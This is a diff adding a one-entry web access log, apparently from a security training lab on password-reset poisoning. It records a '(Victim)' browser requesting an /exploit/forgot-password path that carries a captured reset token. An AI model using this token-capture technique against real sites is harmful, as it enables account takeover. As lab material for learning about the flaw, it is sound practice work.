@@ -1,0 +1,7 @@
+log
+
+EL CARLANGAS
+10.0.3.127      2024-06-28 04:14:15 +0000 "GET
+ /exploit/forgot-password?temp-forgot-password-token=nhuo97u5d4omryplssrbarouya0basez
+  HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) 
+  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
